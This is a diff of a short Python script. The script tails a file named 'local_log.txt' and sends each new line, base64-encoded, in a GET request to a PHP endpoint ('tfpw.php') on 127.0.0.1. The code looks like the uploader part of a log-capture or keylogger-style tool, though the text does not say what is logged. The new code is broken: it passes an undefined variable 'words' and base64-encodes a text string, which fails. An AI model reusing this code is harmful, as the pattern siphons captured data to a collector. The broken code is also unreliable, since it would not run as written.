@@ -3,19 +3,20 @@ import base64
 import sys
 import tailf 
 import time
-
+fn = "local_log.txt"
 time.sleep(20)
-
-with tailf.Tail("local_log.txt") as tail:
-    print("started")
+def watch(fn, words):
+    fp = open(fn, 'r')
     while True:
-        for event in tail:
-            if isinstance(event, bytes):
-                print("updating")
-                r = requests.get('http://127.0.0.1:8080/tfpw.php?data=' + str(base64.b64encode(event)))
-                print("updated")
-            elif event is tailf.Truncated:
-                print("File was truncated")
-        time.sleep(0.01) # save CPU cycles
-  
+        new = fp.readline()
+        # Once all lines are read this just returns ''
+        # until the file changes and a new line appears
+
+        if new:
+            yield new
+        else:
+            time.sleep(0.5)
+            
+for line in watch(fn, words):
+    r = requests.get('http://127.0.0.1:8080/tfpw.php?data=' + str(base64.b64encode(line)))
             
